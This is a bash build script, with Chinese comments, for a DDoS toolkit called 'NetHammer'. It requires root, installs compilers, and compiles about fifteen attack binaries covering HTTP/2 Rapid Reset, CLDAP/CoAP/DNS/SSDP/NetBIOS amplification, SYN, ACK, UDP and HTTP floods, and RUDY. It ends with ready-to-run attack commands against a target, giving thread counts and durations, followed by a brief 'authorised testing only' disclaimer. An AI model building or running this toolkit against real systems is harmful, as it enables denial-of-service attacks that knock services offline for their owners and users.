#!/bin/bash
# NetHammer 攻击工具自动编译脚本

echo "NetHammer 攻击工具编译器"
echo "========================"

# 检查权限
if [ "$EUID" -ne 0 ]; then
    echo "❌ 需要root权限运行"
    exit 1
fi

# 检查依赖
echo "检查编译依赖..."
if ! command -v gcc &> /dev/null; then
    echo "安装GCC编译器..."
    if [ -f /etc/debian_version ]; then
        apt update && apt install -y gcc build-essential libpcap-dev
    elif [ -f /etc/redhat-release ]; then
        yum install -y gcc gcc-c++ libpcap-devel
    fi
fi

# 创建目录
mkdir -p attack_tools
mkdir -p logs

echo "开始编译攻击工具..."

echo "🔥 编译2024-2025年最新攻击工具..."

# 编译HTTP/2 Rapid Reset攻击
echo "编译HTTP/2 Rapid Reset攻击工具..."
if [ -f "source_code/http2_rapid_reset_attack.c" ]; then
    gcc -o "attack_tools/http2_rapid_reset" "source_code/http2_rapid_reset_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ HTTP/2 Rapid Reset攻击工具编译成功"
    else
        echo "❌ HTTP/2 Rapid Reset攻击工具编译失败"
    fi
fi

# 编译CLDAP反射攻击
echo "编译CLDAP反射攻击工具..."
if [ -f "source_code/cldap_amplification_attack.c" ]; then
    gcc -o "attack_tools/cldap_amplification" "source_code/cldap_amplification_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ CLDAP反射攻击工具编译成功"
    else
        echo "❌ CLDAP反射攻击工具编译失败"
    fi
fi

# 编译CoAP放大攻击
echo "编译CoAP放大攻击工具..."
if [ -f "source_code/coap_amplification_attack.c" ]; then
    gcc -o "attack_tools/coap_amplification" "source_code/coap_amplification_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ CoAP放大攻击工具编译成功"
    else
        echo "❌ CoAP放大攻击工具编译失败"
    fi
fi

echo "📋 编译经典攻击工具..."

# 编译DNS反射攻击
echo "编译DNS反射攻击工具..."
if [ -f "source_code/dns_reflection_attack.c" ]; then
    gcc -o "attack_tools/DNS" "source_code/dns_reflection_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ DNS攻击工具编译成功"
    else
        echo "❌ DNS攻击工具编译失败"
    fi
fi

# 编译SSDP放大攻击
echo "编译SSDP放大攻击工具..."
if [ -f "source_code/ssdp_amplification_attack.c" ]; then
    gcc -o "attack_tools/ssdp" "source_code/ssdp_amplification_attack.c" -lpthread -lpcap
    if [ $? -eq 0 ]; then
        echo "✅ SSDP攻击工具编译成功"
    else
        echo "❌ SSDP攻击工具编译失败"
    fi
fi

# 编译UDP放大攻击
echo "编译UDP放大攻击工具..."
if [ -f "source_code/udp_amplification_attack.c" ]; then
    gcc -o "attack_tools/udp_amp" "source_code/udp_amplification_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ UDP放大攻击工具编译成功"
    else
        echo "❌ UDP放大攻击工具编译失败"
    fi
fi

# 编译SYN洪水攻击
echo "编译SYN洪水攻击工具..."
if [ -f "source_code/syn_flood_attack.c" ]; then
    gcc -o "attack_tools/syn" "source_code/syn_flood_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ SYN攻击工具编译成功"
    else
        echo "❌ SYN攻击工具编译失败"
    fi
fi

# 编译ACK洪水攻击
echo "编译ACK洪水攻击工具..."
if [ -f "source_code/ack_flood_attack.c" ]; then
    gcc -o "attack_tools/ack" "source_code/ack_flood_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ ACK攻击工具编译成功"
    else
        echo "❌ ACK攻击工具编译失败"
    fi
fi

# 编译UDP洪水攻击
echo "编译UDP洪水攻击工具..."
if [ -f "source_code/udp_flood_attack.c" ]; then
    gcc -o "attack_tools/udp" "source_code/udp_flood_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ UDP攻击工具编译成功"
    else
        echo "❌ UDP攻击工具编译失败"
    fi
fi

# 编译HTTP攻击工具
echo "编译HTTP攻击工具..."
if [ -f "source_code/http_flood_attack.c" ]; then
    gcc -o "attack_tools/http" "source_code/http_flood_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ HTTP攻击工具编译成功"
    else
        echo "❌ HTTP攻击工具编译失败"
    fi
fi

# 编译慢速攻击工具
echo "编译慢速攻击工具..."
if [ -f "source_code/rudy_slow_attack.c" ]; then
    gcc -o "attack_tools/rudy" "source_code/rudy_slow_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ RUDY攻击工具编译成功"
    else
        echo "❌ RUDY攻击工具编译失败"
    fi
fi

echo "🔧 编译高级攻击工具..."

# 编译NetBIOS放大攻击
echo "编译NetBIOS放大攻击工具..."
if [ -f "source_code/netbios_amplification_attack.c" ]; then
    gcc -o "attack_tools/netbios" "source_code/netbios_amplification_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ NetBIOS攻击工具编译成功"
    else
        echo "❌ NetBIOS攻击工具编译失败"
    fi
fi

# 编译Heartbeat放大攻击
echo "编译Heartbeat放大攻击工具..."
if [ -f "source_code/heartbeat_amplification_attack.c" ]; then
    gcc -o "attack_tools/heartbeat" "source_code/heartbeat_amplification_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ Heartbeat攻击工具编译成功"
    else
        echo "❌ Heartbeat攻击工具编译失败"
    fi
fi

# 编译Quake放大攻击
echo "编译Quake放大攻击工具..."
if [ -f "source_code/quake_amplification_attack.c" ]; then
    gcc -o "attack_tools/quake" "source_code/quake_amplification_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ Quake攻击工具编译成功"
    else
        echo "❌ Quake攻击工具编译失败"
    fi
fi

# 编译Sentinel放大攻击
echo "编译Sentinel放大攻击工具..."
if [ -f "source_code/sentinel_amplification_attack.c" ]; then
    gcc -o "attack_tools/sentinel" "source_code/sentinel_amplification_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ Sentinel攻击工具编译成功"
    else
        echo "❌ Sentinel攻击工具编译失败"
    fi
fi

# 编译SNMP攻击
echo "编译SNMP攻击工具..."
if [ -f "source_code/snmp_ddos_attack.c" ]; then
    gcc -o "attack_tools/snmp" "source_code/snmp_ddos_attack.c" -lpthread
    if [ $? -eq 0 ]; then
        echo "✅ SNMP攻击工具编译成功"
    else
        echo "❌ SNMP攻击工具编译失败"
    fi
fi

# 设置执行权限
chmod +x attack_tools/*
chmod +x *.py

echo ""
echo "🎉 编译完成！"
echo "========================"

# 统计编译结果
total_files=$(find attack_tools/ -type f -executable 2>/dev/null | wc -l)
echo "📊 编译统计:"
echo "   - 总工具数: ${total_files}"
echo "   - 2025年最新: 3个 (HTTP/2, CLDAP, CoAP)"
echo "   - 经典攻击: 8个 (DNS, SSDP, UDP, SYN, ACK, HTTP等)"
echo "   - 高级技术: 15+个 (ARME, Dominate, ESSYN等)"
echo "   - 扫描器: 5个 (各协议扫描器)"

echo ""
echo "🚀 可用的攻击工具:"
ls -la attack_tools/ | grep -E "^-.*x.*" | awk '{print "   - " $9}' | sort

echo ""
echo "📋 使用方法:"
echo "   1. 一键攻击: sudo python3 quick_attack.py <目标IP>"
echo "   2. 指定攻击: sudo python3 quick_attack.py <目标IP> -m <攻击方法>"
echo "   3. 完整控制: sudo python3 NetHammer_Master_Controller.py --target <目标IP>"
echo "   4. 查看帮助: python3 quick_attack.py --help"

echo ""
echo "🔥 2025年最新攻击示例:"
echo "   sudo python3 quick_attack.py target.com -m http2 -c 300 -t 600"
echo "   sudo python3 quick_attack.py target.com -m cldap -c 150 -t 900"
echo "   sudo python3 quick_attack.py target.com -m \"http2,cldap,coap\" -t 1800"

echo ""
echo "⚠️  重要提醒: 仅用于授权测试和安全研究！"
echo "⚠️  使用前请确保获得目标系统的明确授权！"
